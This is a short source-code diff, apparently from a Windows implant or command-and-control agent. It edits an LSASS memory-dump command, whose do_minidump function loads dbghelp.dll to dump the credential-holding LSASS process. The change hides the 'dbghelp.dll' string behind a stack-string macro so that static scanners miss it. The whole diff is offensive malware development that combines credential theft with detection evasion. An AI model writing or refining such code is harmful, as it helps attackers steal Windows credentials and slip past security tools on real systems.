@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_LSASS_DUMP
 
@@ -134,8 +135,8 @@ static auto declfn do_minidump(
     }
 
     // load dbghelp.dll
-    HMODULE h_dbghelp = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
-        symbol<LPCSTR>( "dbghelp.dll" ) ) );
+    STK_DBGHELP(_n);
+    HMODULE h_dbghelp = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_dbghelp ) {
         inst.kernel32.CloseHandle( h_lsass );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
